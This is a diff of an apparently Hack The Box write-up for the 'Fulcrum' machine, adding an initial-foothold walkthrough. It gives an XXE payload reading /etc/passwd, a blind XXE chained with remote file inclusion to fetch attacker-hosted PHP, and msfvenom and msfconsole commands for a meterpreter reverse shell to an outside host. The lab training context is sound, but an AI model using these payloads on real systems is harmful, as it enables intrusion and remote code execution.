@@ -17,7 +17,7 @@ PORT     STATE SERVICE VERSION
 
 After checking out whats there under those webservers 
 
-* 10.10.10.62:4
+* **10.10.10.62:4**
 
     Shows under maintenence
 
@@ -28,33 +28,120 @@ After checking out whats there under those webservers
     There is a good chance thre is a RFI,  However when we run something like this (http://10.10.10.62:4/index.php?
 page=http://10.10.14.99/test) it doesnt connect to our webserver
 
-* 10.10.10.62:80
+* **10.10.10.62:80**
 
     Gives a Server Error
 
     <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-80.PNG"></kbd>
 
-* 10.10.10.62:88
+* **10.10.10.62:88**
 
     Phpmyadmin
 
     <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-88.PNG"></kbd>
 
 
-* 10.10.10.62:9999
+* **10.10.10.62:9999**
 
     PFSense Firewall
     
     <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-9999.PNG"></kbd>
 
-* 10.10.10.62:56423
+* **10.10.10.62:56423**
 
     Looks like some api
 
     <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-56423.PNG"></kbd>
 
 
+### Initial Foothold
 
+The api at 56423 screams xxe
+
+Lets create a xml file and post it to check if there is something fishy going on
+
+xml.txt
+```
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "file:///etc/passwd">
+]>
+<r>&sp;</r>
+```
+
+```
+curl -d @xml.txt http://10.10.10.62:56423
+{"Heartbeat":{"Ping":"Pong"}}
+```
+
+It doesnt give us any kind of data, but there aint no errors either :confused:
+
+From our notes earlier we know that there was a page on port 4 which could have had RFI however it wasnt working
+
+There maybe a firewall rule not allowing it to be done from a external connection
+
+So if we try and do a blind XXE and call the page internally, it just might work
+
+Creating a new xml.txt
+```
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.171/dotatest.php">
+]>
+<r>&sp;</r>
+```
+
+Starting a SimpleHTTPServer
+```
+python -m SimpleHTTPServer 80
+```
+
+Exec curl
+```
+curl -d @xml.txt http://10.10.10.62:56423
+```
+
+BOOM! We got something
+```
+10.10.10.62 - - [13/Dec/2017 03:06:47] "GET /dotastest.php.php HTTP/1.0" 200 -
+```
+
+This means that the RFI does work when called internally.
+
+We also see that it appends an extra ".php" in the GET request, so we can change the xml file as per the requirement
+
+First, lets create a reverse shell php from msfvenom for a sweet meterpreter
+
+```
+msfvenom -p php/meterpreter/reverse_tcp  LHOST=10.10.14.99 LPORT=4442 > dotashell.php
+```
+
+Start a listner in msfconsole
+```
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 10.10.14.99 
+set LPORT 4442
+run
+```
+
+Start a SimpleHTTP server where dotashell.php is stored
+```
+python -m SimpleHTTPServer 80
+```
+
+Create a new xml.txt
+```
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.99/dotashell">
+]>
+<r>&sp;</r>
+```
 
 => Host a php reverse shell
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.171 LPORT=4442 > dotashell.php
